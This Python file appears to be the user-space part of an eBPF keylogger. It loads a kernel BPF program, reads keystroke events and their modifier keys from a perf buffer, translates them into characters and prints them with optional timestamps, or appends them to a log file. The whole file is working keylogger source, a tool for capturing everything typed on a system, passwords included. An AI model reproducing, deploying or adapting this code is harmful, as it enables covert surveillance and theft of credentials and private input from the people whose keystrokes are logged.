import os, sys
import atexit
import signal
import time
from datetime import datetime

from bcc import BPF

from defs import project_path, ticksleep
from keys import translate_keycode
from utils import drop_privileges


class BPFProgram:
    def __init__(self, args):
        self.bpf = None

        self.args = args

    @drop_privileges
    def open_file(self, *args, **kwargs):
        return open(*args, **kwargs)

    def register_exit_hooks(self):
        # Catch signals so we still invoke atexit
        signal.signal(signal.SIGTERM, lambda x, y: sys.exit(0))
        signal.signal(signal.SIGINT, lambda x, y: sys.exit(0))

        # Unregister self.cleanup if already registered
        atexit.unregister(self.cleanup)
        # Register self.cleanup
        atexit.register(self.cleanup)

    def cleanup(self):
        self.bpf = None

    def register_perf_buffers(self):
        def keypress(cpu, data, size):
            event = self.bpf["keypresses"].event(data)
            key = translate_keycode(
                event.code,
                ctrl=event.ctrl,
                alt=event.alt,
                shift=event.shift,
                meta=event.meta,
            )
            if not key:
                return
            msg = key
            if self.args.timestamp:
                now = datetime.now()
                msg = f"[{now.year:02d}/{now.month:02d}/{now.day:02d} {now.hour:02d}:{now.minute:02d}:{now.second:02d}] {msg}"
            print(msg, flush=True)

        self.bpf["keypresses"].open_perf_buffer(keypress)

    def load_bpf(self):
        assert self.bpf == None

        # Set flags
        flags = []
        if self.args.debug:
            flags.append(f"-DBKL_DEBUG")

        with open(os.path.join(project_path, "src/bpf/bpf_program.c"), "r") as f:
            text = f.read()
            self.bpf = BPF(text=text, cflags=flags)
        self.register_exit_hooks()
        self.register_perf_buffers()

    def main(self):
        self.load_bpf()

        if self.args.outfile:
            sys.stdout = self.open_file(self.args.outfile, "a+")

        print("Logging key presses... ctrl-c to quit", file=sys.stderr)

        while True:
            time.sleep(ticksleep)
            if self.args.debug:
                self.bpf.trace_print()
            self.bpf.perf_buffer_poll()
